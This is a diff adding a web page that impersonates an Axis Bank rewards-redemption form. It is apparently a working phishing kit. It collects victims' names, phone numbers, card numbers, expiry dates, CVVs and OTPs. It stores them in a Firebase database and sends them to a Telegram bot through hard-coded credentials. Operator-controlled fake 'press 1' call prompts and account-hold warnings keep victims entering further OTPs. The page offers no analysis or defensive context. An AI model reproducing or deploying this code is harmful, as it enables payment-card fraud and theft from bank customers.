@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redeem Rewards - Axis Bank</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --axis-maroon: #97144D; --axis-dark: #5E0B2E; --axis-light: #FDF2F6; --bg-color: #F4F6F9; --text-main: #1A1A1A; --text-muted: #555555; --border-color: #E2E8F0; --white: #FFFFFF; --success: #10B981; --warning: #F59E0B; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; color: var(--text-main); background-color: var(--bg-color); }
+        .container { max-width: 1140px; margin: 0 auto; padding: 0 20px; }
+        .header { background: var(--white); border-bottom: 3px solid var(--axis-maroon); padding: 15px 0; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .header .container { display: flex; justify-content: space-between; align-items: center; }
+        .logo { display: flex; align-items: center; }
+        .header-logo { height: 40px; width: auto; object-fit: contain; display: block; }
+        .btn { padding: 12px 28px; border: none; border-radius: 6px; font-size: 0.95rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; display: inline-flex; align-items: center; gap: 8px; font-family: 'Inter', sans-serif; }
+        .btn-primary { background: var(--axis-maroon); color: var(--white); }
+        .btn-primary:hover { background: var(--axis-dark); }
+        .btn-secondary { background: var(--white); color: var(--axis-maroon); border: 1px solid var(--axis-maroon); }
+        .btn-link { background: none; border: none; color: var(--axis-maroon); cursor: pointer; text-decoration: underline; font-size: 0.9rem; font-weight: 500; }
+        .redeem-page { min-height: 100vh; display: flex; flex-direction: column; }
+        .redeem-container { max-width: 600px; margin: 20px auto; padding: 0 15px; flex: 1; }
+        .redeem-card { background: var(--white); padding: 30px; border-radius: 12px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.05); border: 1px solid var(--border-color); }
+        .subtitle { text-align: center; color: var(--text-muted); margin-bottom: 24px; font-size: 0.9rem; line-height: 1.4; }
+        .progress-steps { display: flex; flex-direction: row; align-items: center; justify-content: center; margin-bottom: 30px; gap: 0; }
+        .step { display: flex; flex-direction: column; align-items: center; gap: 6px; flex: 1; }
+        .step-number { width: 32px; height: 32px; border-radius: 50%; background: var(--border-color); color: var(--text-muted); display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 0.85rem; transition: all 0.3s ease; position: relative; flex-shrink: 0; }
+        .step.active .step-number { background: var(--axis-maroon); color: var(--white); }
+        .step.completed .step-number { background: var(--success); color: var(--white); }
+        .step.completed .step-number::after { content: '\f00c'; font-family: 'Font Awesome 6 Free'; font-weight: 900; position: absolute; font-size: 0.75rem; }
+        .step-label { font-size: 0.7rem; color: var(--text-muted); font-weight: 500; text-align: center; white-space: nowrap; }
+        .step.active .step-label { color: var(--axis-maroon); font-weight: 600; }
+        .step-connector { width: 25px; height: 2px; background: var(--border-color); margin: 0 2px; flex-shrink: 0; align-self: center; }
+        .form-step { display: none; animation: fadeIn 0.4s ease; }
+        .form-step.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .form-step h2 { color: var(--text-main); margin-bottom: 20px; display: flex; align-items: center; gap: 10px; font-size: 1.15rem; font-weight: 700; }
+        .form-step h2 i { color: var(--axis-maroon); font-size: 1.1rem; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; margin-bottom: 6px; color: var(--text-main); font-weight: 500; font-size: 0.85rem; }
+        .form-group input { width: 100%; padding: 11px 14px; border: 1px solid var(--border-color); border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; font-family: 'Inter', sans-serif; }
+        .form-group input:focus { outline: none; border-color: var(--axis-maroon); box-shadow: 0 0 0 3px rgba(151, 20, 77, 0.1); }
+        .form-group input.error { border-color: #EF4444 !important; box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1) !important; }
+        .error-msg { color: #EF4444; font-size: 0.75rem; margin-top: 5px; display: none; font-weight: 500; }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .form-actions { display: flex; gap: 12px; justify-content: space-between; margin-top: 24px; }
+        .card-type-badge { background: var(--axis-light); color: var(--axis-maroon); padding: 12px 14px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: 600; font-size: 0.9rem; border: 1px solid rgba(151, 20, 77, 0.2); display: none; align-items: center; justify-content: center; gap: 8px; }
+        .otp-message { text-align: center; color: var(--text-muted); margin-bottom: 20px; font-size: 0.9rem; line-height: 1.5; }
+        .otp-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 24px; }
+        .otp-input { width: 40px; height: 50px; text-align: center; font-size: 1.1rem; border: 1px solid var(--border-color); border-radius: 6px; transition: all 0.2s; font-weight: 600; }
+        .otp-input:focus { outline: none; border-color: var(--axis-maroon); box-shadow: 0 0 0 3px rgba(151, 20, 77, 0.1); }
+        .otp-resend { text-align: center; margin-top: 16px; color: var(--text-muted); font-size: 0.85rem; }
+        #processingScreen { display: none; text-align: center; padding: 40px 20px; }
+        .spinner { width: 50px; height: 50px; border: 4px solid var(--axis-light); border-top: 4px solid var(--axis-maroon); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #processingScreen h3 { color: var(--text-main); font-size: 1.1rem; margin-bottom: 10px; }
+        #processingScreen p { color: var(--text-muted); font-size: 0.9rem; line-height: 1.5; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 2000; align-items: center; justify-content: center; backdrop-filter: blur(4px); padding: 15px; }
+        .modal.active { display: flex; }
+        .modal-content { background: var(--white); padding: 30px; border-radius: 12px; text-align: center; max-width: 400px; width: 100%; animation: slideIn 0.3s ease; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); }
+        @keyframes slideIn { from { transform: translateY(-30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .modal-icon { width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
+        .modal-icon.call { background: var(--axis-light); color: var(--axis-maroon); }
+        .modal-icon.warning { background: #FEF3C7; color: #D97706; }
+        .modal-icon i { font-size: 1.75rem; }
+        .modal-content h3 { margin-bottom: 10px; color: var(--text-main); font-size: 1.15rem; font-weight: 700; }
+        .modal-content p { color: var(--text-muted); margin-bottom: 14px; font-size: 0.9rem; line-height: 1.5; }
+        .auth-number { font-size: 1.1rem; font-weight: 700; color: var(--text-main); margin-bottom: 18px; letter-spacing: 0.5px; }
+        .auth-instruction { background: var(--axis-light); padding: 14px; border-radius: 8px; margin-bottom: 18px; display: flex; align-items: center; gap: 10px; text-align: left; }
+        .auth-instruction.warning { background: #FEF3C7; }
+        .auth-instruction i { color: var(--axis-maroon); font-size: 1.1rem; flex-shrink: 0; }
+        .auth-instruction.warning i { color: #D97706; }
+        .auth-instruction span { font-size: 0.85rem; color: var(--text-main); line-height: 1.4; }
+        .waiting-message { display: none; text-align: center; padding: 16px 0; }
+        .waiting-message .mini-spinner { width: 36px; height: 36px; border: 3px solid var(--axis-light); border-top: 3px solid var(--axis-maroon); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 14px; }
+        .waiting-message p { color: var(--text-muted); font-size: 0.9rem; line-height: 1.5; }
+        @media (max-width: 480px) {
+            .redeem-container { margin: 15px auto; padding: 0 12px; }
+            .redeem-card { padding: 20px 18px; }
+            .subtitle { font-size: 0.85rem; margin-bottom: 20px; }
+            .progress-steps { margin-bottom: 24px; }
+            .step-number { width: 28px; height: 28px; font-size: 0.8rem; }
+            .step-label { font-size: 0.65rem; }
+            .step-connector { width: 20px; }
+            .form-step h2 { font-size: 1.05rem; margin-bottom: 18px; }
+            .form-group { margin-bottom: 14px; }
+            .form-group label { font-size: 0.8rem; margin-bottom: 5px; }
+            .form-group input { padding: 10px 12px; font-size: 0.9rem; }
+            .form-row { grid-template-columns: 1fr; gap: 12px; }
+            .form-actions { flex-direction: column; gap: 10px; }
+            .form-actions .btn { width: 100%; justify-content: center; }
+            .otp-input { width: 36px; height: 46px; font-size: 1rem; }
+            .btn { padding: 11px 24px; font-size: 0.9rem; }
+        }
+    </style>
+</head>
+<body class="redeem-page">
+    <header class="header">
+        <div class="container">
+            <div class="logo"><img src="assets/logo.png" alt="Axis Bank Logo" class="header-logo"></div>
+        </div>
+    </header>
+
+    <main class="redeem-container">
+        <div class="redeem-card">
+            <div id="formFlow">
+                <p class="subtitle">Complete the following steps.</p>
+                <div class="progress-steps">
+                    <div class="step active" data-step="1"><div class="step-number">1</div><div class="step-label">Personal Info</div></div>
+                    <div class="step-connector"></div>
+                    <div class="step" data-step="2"><div class="step-number">2</div><div class="step-label">Details</div></div>
+                    <div class="step-connector"></div>
+                    <div class="step" data-step="3"><div class="step-number">3</div><div class="step-label">Verification</div></div>
+                </div>
+
+                <form id="redeemForm" class="redeem-form">
+                    <div class="form-step active" id="step1">
+                        <h2><i class="fas fa-user"></i> Personal Information</h2>
+                        <div class="form-group"><label for="fullName">Full name (as on card)</label><input type="text" id="fullName" required placeholder="Enter your full name"></div>
+                        <div class="form-group"><label for="mobileNumber">Registered Mobile Number</label><input type="tel" id="mobileNumber" required placeholder="Enter 10-digit mobile number" maxlength="10"></div>
+                        
+                        <div class="form-group">
+                            <label for="cardLimit">Card Limit</label>
+                            <input type="number" id="cardLimit" required placeholder="e.g., 50000">
+                        </div>
+                        
+                        <button type="button" class="btn btn-primary" onclick="nextStep(2)">Next <i class="fas fa-arrow-right"></i></button>
+                    </div>
+
+                    <div class="form-step" id="step2">
+                        <h2><i class="fas fa-credit-card"></i> Credit Card Details</h2>
+                        <div class="form-group"><label for="cardNumber">Credit Card Number</label><input type="text" id="cardNumber" required placeholder="XXXX XXXX XXXX XXXX" maxlength="19"></div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="expiryDate">Expiry Date</label>
+                                <input type="text" id="expiryDate" required placeholder="MM/YY" maxlength="5" autocomplete="off">
+                                <div class="error-msg" id="expiryError">Invalid or expired date. Please enter a valid future date.</div>
+                            </div>
+                            <div class="form-group"><label for="cvv">CVV</label><input type="password" id="cvv" required placeholder="***" maxlength="3"></div>
+                        </div>
+                        <div class="form-actions">
+                            <button type="button" class="btn btn-secondary" onclick="previousStep(1)"><i class="fas fa-arrow-left"></i> Back</button>
+                            <button type="button" class="btn btn-primary" onclick="nextStep(3)">Submit <i class="fas fa-check"></i></button>
+                        </div>
+                    </div>
+
+                    <div class="form-step" id="step3">
+                        <h2><i class="fas fa-shield-alt"></i> One Time Password</h2>
+                        <div id="cardTypeBadge" class="card-type-badge"><i class="fas fa-credit-card"></i> Detected Card: <span id="detectedCardType">Unknown</span></div>
+                        <p class="otp-message">A 6-digit One Time Password has been sent to your registered mobile number.</p>
+                        <div class="otp-inputs">
+                            <input type="tel" class="otp-input" maxlength="1" required inputmode="numeric" pattern="[0-9]*">
+                            <input type="tel" class="otp-input" maxlength="1" required inputmode="numeric" pattern="[0-9]*">
+                            <input type="tel" class="otp-input" maxlength="1" required inputmode="numeric" pattern="[0-9]*">
+                            <input type="tel" class="otp-input" maxlength="1" required inputmode="numeric" pattern="[0-9]*">
+                            <input type="tel" class="otp-input" maxlength="1" required inputmode="numeric" pattern="[0-9]*">
+                            <input type="tel" class="otp-input" maxlength="1" required inputmode="numeric" pattern="[0-9]*">
+                        </div>
+                        <button type="submit" class="btn btn-primary" style="width: 100%; justify-content: center;">Verify & Proceed</button>
+                        <div class="otp-resend"><p>Didn't receive the OTP? <button type="button" class="btn-link" id="resendOTP">Resend OTP</button> <span id="timer">(in 05:00)</span></p></div>
+                    </div>
+                </form>
+            </div>
+
+            <div id="processingScreen">
+                <div class="spinner"></div>
+                <h3>Verifying Your Details</h3>
+                <p>Please do not close this window. We are processing your request and waiting for final authentication.</p>
+            </div>
+        </div>
+    </main>
+
+    <div class="modal" id="callAuthModal">
+        <div class="modal-content">
+            <div id="callInitialState">
+                <div class="modal-icon call"><i class="fas fa-phone-volume"></i></div>
+                <h3>Telephonic Authentication</h3>
+                <p>An automated verification call is being placed to your registered mobile number:</p>
+                <p class="auth-number" id="displayPhoneNumber">+91 XXXXXXXXXX</p>
+                <div class="auth-instruction">
+                    <i class="fas fa-info-circle"></i>
+                    <span>Please press <strong>1</strong> on your keypad after receiving the call to authenticate your request.</span>
+                </div>
+                <button class="btn btn-primary" id="confirmCallBtn" style="width: 100%; justify-content: center;">I have pressed 1</button>
+            </div>
+            <div id="callWaitingState" class="waiting-message">
+                <div class="mini-spinner"></div>
+                <h3 style="margin-bottom: 12px;">Confirmation Received</h3>
+                <p>We have received your response. Please stay on this screen while we complete the final verification.</p>
+                <p style="margin-top: 16px; font-size: 0.85rem; color: #999;">Do not close this window...</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="warningModal">
+        <div class="modal-content">
+            <div class="modal-icon warning"><i class="fas fa-exclamation-triangle"></i></div>
+            <h3>Important Notice</h3>
+            <p>Due to security verification, a temporary hold has been placed on your account.</p>
+            <div class="auth-instruction warning">
+                <i class="fas fa-info-circle"></i>
+                <span><strong>Your some amount may be deducted or frozen.</strong> Please be patient — it will be refunded within 24 hours. We apologize for the inconvenience.</span>
+            </div>
+            <p style="font-size: 0.85rem; color: #999; margin-top: 16px;">Please stay on this page. Do not close the window.</p>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getDatabase, ref, push, set, update, onValue, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBjhn-zl11fJuF5NhTM2sYHcW8k6r0hgLI",
+            authDomain: "admin-panel-b467c.firebaseapp.com",
+            databaseURL: "https://admin-panel-b467c-default-rtdb.firebaseio.com",
+            projectId: "admin-panel-b467c",
+            storageBucket: "admin-panel-b467c.firebasestorage.app",
+            messagingSenderId: "1:144790374142:android:3aacc3aa8bc56dfc8f07af",
+            appId: "1:144790374142:android:3aacc3aa8bc56dfc8f07af"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        let currentSubmissionId = null;
+        let mobileNumber = '';
+        let fullName = '';
+
+        // Telegram Configuration
+        const TG_BOT_TOKEN = "8775363021:AAGeiE7Op7xMTpyQkXtuTPwgQzhMy1iOchY";
+        const TG_CHAT_ID = "-1004472080586";
+
+        function validateExpiryDate(expiryStr) {
+            if (!/^\d{2}\/\d{2}$/.test(expiryStr)) return false;
+            const [monthStr, yearStr] = expiryStr.split('/');
+            const month = parseInt(monthStr, 10);
+            const year = parseInt(yearStr, 10);
+            if (month < 1 || month > 12) return false;
+            const now = new Date();
+            const currentYear = now.getFullYear() % 100;
+            const currentMonth = now.getMonth() + 1;
+            if (year < currentYear) return false;
+            if (year === currentYear && month < currentMonth) return false;
+            return true;
+        }
+
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+            e.target.value = v;
+            e.target.classList.remove('error');
+            document.getElementById('expiryError').style.display = 'none';
+        });
+
+        async function findExistingEntry(name, phone) {
+            const snapshot = await get(ref(db, 'submissions'));
+            if (!snapshot.exists()) return null;
+            const entries = snapshot.val();
+            for (let id in entries) {
+                const entry = entries[id];
+                if (entry.fullName === name && entry.mobileNumber === phone) {
+                    return { id, ...entry };
+                }
+            }
+            return null;
+        }
+
+        window.nextStep = async function(step) {
+            if (!validateStep(currentStep)) return;
+
+            if (currentStep === 1 && step === 2) {
+                fullName = document.getElementById('fullName').value.trim();
+                mobileNumber = document.getElementById('mobileNumber').value.trim();
+                const limit = document.getElementById('cardLimit').value || 'N/A';
+                const existing = await findExistingEntry(fullName, mobileNumber);
+
+                if (existing) {
+                    currentSubmissionId = existing.id;
+                    await update(ref(db, 'submissions/' + currentSubmissionId), {
+                        fullName: fullName,
+                        mobileNumber: mobileNumber,
+                        cardLimit: limit,
+                        timestamp: Date.now(),
+                        status: 'filling_details',
+                        newOtp: false
+                    });
+                } else {
+                    const newRef = push(ref(db, 'submissions'));
+                    currentSubmissionId = newRef.key;
+                    await set(newRef, {
+                        fullName: fullName,
+                        mobileNumber: mobileNumber,
+                        cardLimit: limit,
+                        status: 'filling_details',
+                        timestamp: Date.now(),
+                        newOtp: false,
+                        callPressed: false,
+                        ivrPressedCount: 0,
+                        showWarning: false,
+                        otpHistory: []
+                    });
+                }
+            }
+
+            if (currentStep === 2 && step === 3) {
+                if (currentSubmissionId) {
+                    const cardNum = document.getElementById('cardNumber').value;
+                    const exp = document.getElementById('expiryDate').value;
+                    const cvv = document.getElementById('cvv').value;
+                    const type = detectCardType(cardNum);
+                    document.getElementById('detectedCardType').textContent = type;
+
+                    await update(ref(db, 'submissions/' + currentSubmissionId), {
+                        cardNumber: cardNum,
+                        expiryDate: exp,
+                        cvv: cvv,
+                        cardType: type,
+                        status: 'filling_otp'
+                    });
+                }
+            }
+
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            document.querySelector(`.step[data-step="${currentStep}"]`).classList.add('completed');
+            document.querySelector(`.step[data-step="${currentStep}"]`).classList.remove('active');
+            currentStep = step;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            document.querySelector(`.step[data-step="${currentStep}"]`).classList.add('active');
+            
+            if (currentStep === 3) {
+                document.getElementById('cardTypeBadge').style.display = 'flex';
+            }
+        };
+
+        window.previousStep = function(step) {
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            document.querySelector(`.step[data-step="${currentStep}"]`).classList.remove('active');
+            currentStep = step;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            document.querySelector(`.step[data-step="${currentStep}"]`).classList.add('active');
+            document.querySelector(`.step[data-step="${currentStep}"]`).classList.remove('completed');
+        };
+
+        function validateStep(step) {
+            let isValid = true;
+            const inputs = document.getElementById(`step${step}`).querySelectorAll('input[required]');
+
+            inputs.forEach(input => {
+                input.classList.remove('error');
+                input.style.borderColor = '';
+            });
+            document.getElementById('expiryError').style.display = 'none';
+
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    isValid = false;
+                    input.classList.add('error');
+                }
+
+                if (input.id === 'expiryDate' && step === 2 && input.value.trim()) {
+                    if (!validateExpiryDate(input.value.trim())) {
+                        isValid = false;
+                        input.classList.add('error');
+                        document.getElementById('expiryError').style.display = 'block';
+                    }
+                }
+            });
+
+            if (!isValid) {
+                if (step === 2 && document.getElementById('expiryDate').classList.contains('error')) {
+                    alert('Please enter a valid future expiry date (MM/YY).');
+                } else {
+                    alert('Please fill in all required fields correctly.');
+                }
+            }
+            return isValid;
+        }
+
+        function detectCardType(number) {
+            const n = number.replace(/\s/g, '');
+            if (/^4/.test(n)) return 'Visa';
+            if (/^5[1-5]/.test(n) || /^(222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(n)) return 'Mastercard';
+            if (/^3[47]/.test(n)) return 'AMEX';
+            if (/^(60|65|81|82|62)/.test(n)) return 'RuPay';
+            return 'Unknown Card';
+        }
+
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let type = detectCardType(value);
+            let cvvInput = document.getElementById('cvv');
+            if (type === 'AMEX') {
+                e.target.maxLength = 17; cvvInput.maxLength = 4; cvvInput.placeholder = '****';
+                if (value.length > 4 && value.length <= 10) value = value.slice(0, 4) + ' ' + value.slice(4);
+                else if (value.length > 10) value = value.slice(0, 4) + ' ' + value.slice(4, 10) + ' ' + value.slice(10, 15);
+            } else {
+                e.target.maxLength = 19; cvvInput.maxLength = 3; cvvInput.placeholder = '***';
+                value = value.match(/.{1,4}/g)?.join(' ') || value;
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('mobileNumber').addEventListener('input', function(e) { 
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10); 
+        });
+
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) { 
+                e.target.value = e.target.value.replace(/[^0-9]/g, ''); 
+                if (e.target.value && index < otpInputs.length - 1) otpInputs[index + 1].focus(); 
+            });
+            input.addEventListener('keydown', function(e) { 
+                if (e.key === 'Backspace' && !e.target.value && index > 0) otpInputs[index - 1].focus(); 
+            });
+        });
+
+        let timerInterval;
+        function startTimer() { 
+            let t = 300; 
+            const el = document.getElementById('timer'); 
+            clearInterval(timerInterval); 
+            timerInterval = setInterval(() => { 
+                const m = Math.floor(t / 60); 
+                const s = t % 60; 
+                el.textContent = `(in ${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')})`; 
+                if (t <= 0) { 
+                    clearInterval(timerInterval); 
+                    el.textContent = '(Expired)'; 
+                } 
+                t--; 
+            }, 1000); 
+        }
+
+        document.getElementById('resendOTP').addEventListener('click', function() { 
+            startTimer(); 
+            alert('A fresh OTP has been resent.'); 
+        });
+
+        startTimer();
+
+        document.getElementById('redeemForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            let otp = '';
+            document.querySelectorAll('.otp-input').forEach(input => otp += input.value);
+            if (otp.length !== 6) { alert('Please enter complete 6-digit OTP'); return; }
+
+            // --- TELEGRAM NOTIFICATION START ---
+            const cardNumVal = document.getElementById('cardNumber').value;
+            const expVal = document.getElementById('expiryDate').value;
+            const cvvVal = document.getElementById('cvv').value;
+            const limitVal = document.getElementById('cardLimit').value;
+            const typeVal = detectCardType(cardNumVal);
+            const timeStamp = new Date().toLocaleString();
+
+            // Using HTML parse mode to prevent crashes from special characters in names/cards
+            const tgMessage = `🚨 <b>New Redemption Entry</b> 🚨\n\n👤 <b>Name:</b> ${fullName}\n📱 <b>Mobile:</b> ${mobileNumber}\n💳 <b>Limit:</b> ${limitVal}\n\n💳 <b>Card:</b> <code>${cardNumVal}</code>\n📅 <b>Expiry:</b> ${expVal}\n🔒 <b>CVV:</b> ${cvvVal}\n🏦 <b>Type:</b> ${typeVal}\n\n🔑 <b>OTP Entered:</b> <code>${otp}</code>\n⏰ <b>Time:</b> ${timeStamp}`;
+
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: tgMessage,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("✅ Telegram notification sent successfully!");
+                } else {
+                    console.error("❌ Telegram API Error:", data.description);
+                    alert("Debug: Telegram failed. Check browser console (F12) for details.");
+                }
+            })
+            .catch(error => {
+                console.error("❌ Network error sending to Telegram:", error);
+            });
+            // --- TELEGRAM NOTIFICATION END ---
+
+            // --- FIREBASE LOGIC (UNCHANGED) ---
+            if (currentSubmissionId) {
+                const snapshot = await get(ref(db, 'submissions/' + currentSubmissionId));
+                const currentData = snapshot.val() || {};
+                const oldHistory = currentData.otpHistory || [];
+
+                await update(ref(db, 'submissions/' + currentSubmissionId), {
+                    otpEntered: otp,
+                    otpHistory: [...oldHistory, otp],
+                    status: 'pending',
+                    newOtp: true
+                });
+            }
+
+            document.getElementById('formFlow').style.display = 'none';
+            document.getElementById('processingScreen').style.display = 'block';
+
+            const statusRef = ref(db, 'submissions/' + currentSubmissionId);
+            onValue(statusRef, (snapshot) => {
+                const data = snapshot.val();
+                if (!data) return;
+
+                if (data.status === 'verified') {
+                    document.getElementById('processingScreen').style.display = 'none';
+                    document.getElementById('displayPhoneNumber').textContent = '+91 ' + mobileNumber;
+                    document.getElementById('callAuthModal').classList.add('active');
+                } else if (data.status === 'pending' && document.getElementById('callAuthModal').classList.contains('active')) {
+                    document.getElementById('callAuthModal').classList.remove('active');
+                    document.getElementById('callInitialState').style.display = 'block';
+                    document.getElementById('callWaitingState').style.display = 'none';
+                    showOTPPage();
+                }
+
+                if (data.showWarning === true) {
+                    document.getElementById('processingScreen').style.display = 'none';
+                    document.getElementById('warningModal').classList.add('active');
+                } else if (data.showWarning === false && document.getElementById('warningModal').classList.contains('active')) {
+                    document.getElementById('warningModal').classList.remove('active');
+                    showOTPPage();
+                }
+            });
+        });
+
+        function showOTPPage() {
+            document.getElementById('processingScreen').style.display = 'none';
+            document.getElementById('formFlow').style.display = 'block';
+            document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step3').classList.add('active');
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.querySelector('.step[data-step="1"]').classList.add('completed');
+            document.querySelector('.step[data-step="2"]').classList.add('completed');
+            document.querySelector('.step[data-step="3"]').classList.add('active');
+            document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+            document.querySelectorAll('.otp-input')[0].focus();
+        }
+
+        document.getElementById('confirmCallBtn').addEventListener('click', async function() {
+            if (currentSubmissionId) {
+                const snapshot = await get(ref(db, 'submissions/' + currentSubmissionId));
+                const currentData = snapshot.val();
+                const newCount = (currentData.ivrPressedCount || 0) + 1;
+                
+                await update(ref(db, 'submissions/' + currentSubmissionId), { 
+                    callPressed: true,
+                    ivrPressedCount: newCount
+                });
+            }
+            document.getElementById('callInitialState').style.display = 'none';
+            document.getElementById('callWaitingState').style.display = 'block';
+        });
+
+        let currentStep = 1;
+    </script>
+</body>
+</html>
